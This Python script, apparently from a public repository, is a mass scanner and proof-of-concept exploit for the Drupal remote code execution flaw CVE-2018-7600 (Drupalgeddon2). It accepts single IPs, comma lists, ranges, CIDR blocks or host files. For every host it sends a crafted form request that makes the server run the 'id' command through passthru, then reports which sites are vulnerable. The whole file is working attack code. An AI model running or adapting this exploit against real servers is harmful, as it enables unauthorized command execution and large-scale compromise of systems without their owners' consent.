#written by fyraiga 
#uso: scan.py [ip]
#POC adapted from FireFart CVE-2018-7600
#import here
import argparse
import ipaddress
import itertools
import re
import requests
import sys
import time
#functions
def exploit(ip_targets):
    send_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]':'id', 'name[#type]':'markup'}
    send_data = {'form_id':'user_pass', '_triggering_element_name':'name'}
    ipregex = re.compile("(\d{1,3}\.){3}\d{1,3}.*")
    num_scanned = len(ip_targets)
    num_vuln = 0
    time_start = time.time()
    for ip_target in ip_targets:
        result = ipregex.match(ip_target)
        ip_target = "http://"+ip_target
        if result is not None:
            r = None
            print("{:=<74}".format(""))
            print("[~] {:<60} [{:^7}]".format(ip_target, "..."), end="", flush=True)
            if verbose == True:
                try:
                    r = requests.post(ip_target, data=send_data, params=send_params, timeout=3)
                except requests.exceptions.Timeout:
                    print("\r[~] {:<60} [{:^7}]".format(ip_target, "ERR"))
                    print("{:>7} ERROR: Server seems to be down (Timeout)".format("--"))
                    continue
                except requests.exceptions.ConnectionError:
                    print("\r[~] {:<60} [{:^7}]".format(ip_target, "ERR"))
                    print("{:>7} ERROR: Unable to connect to the webserver (Connection Error)".format("--"))
                    continue
                except requests.exceptions.HTTPError:
                    print("\r[~] {:<60} [{:^7}]".format(ip_target, "ERR"))
                    print("{:>7} ERROR: 4xx/5xx".format("--"))
                    continue
                except requests.exceptions.InvalidURL:
                    print("\r[~] {:<60} [{:^7}]".format(ip_target, "ERR"))
                    print("{:>7} ERROR: Invalid URL.".format("--"))
                    continue
                except Exception:
                    print("\r[~] {:<60} [{:^7}]".format(ip_target, "ERR"))
                    print("{:>7} ERROR: Unexpected Error".format("--"))
                    sys.exit()
                else: 
                    print("\r[~] {:<60} [{:^7}]".format(ip_target, "OK"))
                    print("{:>7} OK: Alive".format("--"))
            else:
                try:
                    r = requests.post(ip_target, data=send_data, params=send_params, timeout=5)
                except Exception:
                    print("\r[~] {:<60} [{:^7}]".format(ip_target, "ERR"))
                    continue
                else:
                    print("\r[~] {:<60} [{:^7}]".format(ip_target, "OK"))
            #Finding block of data to check server type
            m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
            if m:
                if verbose == True:
                    print("{:>7} OK: Server seems to be running Drupal".format("--"))
                found = m.group(1)
                send_params2 = {'q':'file/ajax/name/#value/' + found}
                send_data2 = {'form_build_id':found}
                r = requests.post(ip_target, data=send_data2, params=send_params2)
                r.encoding = 'ISO-8859-1'
                out = r.text.split("[{")[0].strip()
                if out == "":
                    print("{:>7} Patched (CVE-2018-7600)".format("--"))
                    continue
                else: 
                    print("{:>7} Vulnerable (CVE-2018-7600)".format("--"))
                    num_vuln += 1
            else:
                print("{:>7} Doesnt seem like a Drupal server?".format("--"))
                continue
        else:
            raise ValueError("Invalid IP Address")
    time_fin = time.time()
    print("{:=<74}".format(""))
    print("[+] {} target(s) scanned, {} target(s) vulnerable (CVE-2018-7600)".format(num_scanned, num_vuln))
    print("[+] Scan completed in {:.3f} seconds".format(time_fin-time_start))
def process_file(target):
    hostlist = []
    try:
        file = open(target, "r")
        for line in file:
            hostlist.append(line.strip())
        exploit(hostlist)
    except FileNotFoundError:
        print("[!] Unable to locate file. Check file path.")
        sys.exit()
    except ValueError:
        print("[!] Invalid value in file. Ensure only IPv4 addresses exist!")
        sys.exit()
    except Exception as e:
        print(e)
        print("[!] Unexpected Error! This should not be happening. Please inform me at Github!")
        sys.exit()
def process_multiple(target):
    hostlist = target.split(",")
    try:
        for data in hostlist:
            data = data.strip()
        exploit(hostlist)
    except ValueError:
        print("[!] Invalid Input. Only IPv4 addresses are accepted.")
        sys.exit()
    except Exception:
        print("[!] Unexpected Error! This should not be happening. Please inform me at Github!")
        sys.exit()
def process_range(target):
    try:
        hostlist = []
        raw_octets = target.split(".")
        octets = [x.strip().split("-") for x in raw_octets]
        octet_range = [range(int(x[0]), int(x[1])+1) if len(x) == 2 else x for x in octets]
        for x in itertools.product(*octet_range):
            hostlist.append('.'.join(map(str,x)).strip())
        exploit(hostlist)
    except ValueError:
        print("[!] Invalid Input. Only IPv4 ranges are accepted.")
        sys.exit()
    except Exception as e:
        print(e)
        print("Unexpected Errror")
        sys.exit()
def process_ip(target):
    try:
        exploit([target.strip()])
    except ValueError:
        print("[!] Invalid Input. Only IPv4 & valid CIDR addresses are accepted for IP mode.\n{:>7} Use -h to see other modes.".format("--"))
        sys.exit()
    except Exception:
        print("[!] Unexpected Error")
        sys.exit()
def process_cidr(target):
    hostlist = []
    try:
        net = ipaddress.ip_network(target.strip(), strict=False)
        for host in net.hosts():
            hostlist.append(str(host))
        exploit(hostlist)
    except ValueError:
        print("[!] Invalid Input. Only IPv4 & valid CIDR addresses are accepted for IP mode.\n{:>7} Use -h to see other modes.".format("--"))
        sys.exit()
    except Exception:
        print("[!] Unexpected Error")
        sys.exit()
#main here
def main():
    parser = argparse.ArgumentParser(prog="drupalgeddon2-scan.py",
    formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=50))
    try:
        parser.add_argument("target", help="IP of target site(s)")
        parser.add_argument('-c', "--cidr", default=False, action="store_true", help="Generate & scan a range given a CIDR address")
        parser.add_argument('-f', "--file", default=False, action="store_true", help="Retrieve IP Addresses from a file (1 per line)")
        parser.add_argument('-i', "--ip", default=True, action="store_true", help="Single IP Address (CIDR migrated to a seperate mode)")
        parser.add_argument('-m', "--multiple", default=False, action="store_true", help="Multiple IP Adddress e.g. 192.168.0.1,192.168.0.2,192.168.0.3")
        parser.add_argument('-r', "--range", default=False, action="store_true", help="IP Range e.g. 192.168.1-2.0-254 (nmap format)")
        parser.add_argument('-v', "--verbose", default=False, action="store_true", help="Provide a more verbose display")
        parser.add_argument("-o", "--http-only", default=False, action="store_true", help="To be implemented (Current state, https not implemented)")
        parser.add_argument("-s", "--https-only", default=False, action="store_true", help="To be implemented")
    except Exception:
        print("[!] Unexpected Error! This should not be happening. Please inform me at Github!")
        sys.exit()
    try:
        args, u = parser.parse_known_args()
    except Exception:
        print("[!] Invalid arguments!")
        sys.exit()
    #renaming variable
    global verbose 
    verbose = args.verbose
    #Verbose message
    print("[~] Starting scan...")
    #IP range in a CIDR format
    if args.cidr == True:
        process_cidr(args.target)
    #IPs from a file
    elif args.file == True:
        process_file(args.target)
    #Multiple IPs (separated w commas)
    elif args.multiple == True:
        process_multiple(args.target)
    #IP Range (start-end)
    elif args.range == True:
        process_range(args.target)
    #IP Address/CIDR
    elif args.ip == True:
        process_ip(args.target)
        
    #Unrecognised arguments
    else:
        print("[!] Unexpected Outcome! This should not be happening. Please inform me at Github!")
        sys.exit()
    sys.exit()
#ifmain here
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print ("\n-- Ctrl+C caught. Terminating program.")
    except Exception as e:
        print(e)
        print("[!] Unexpected Error! This should not be happening. Please inform me at Github!")
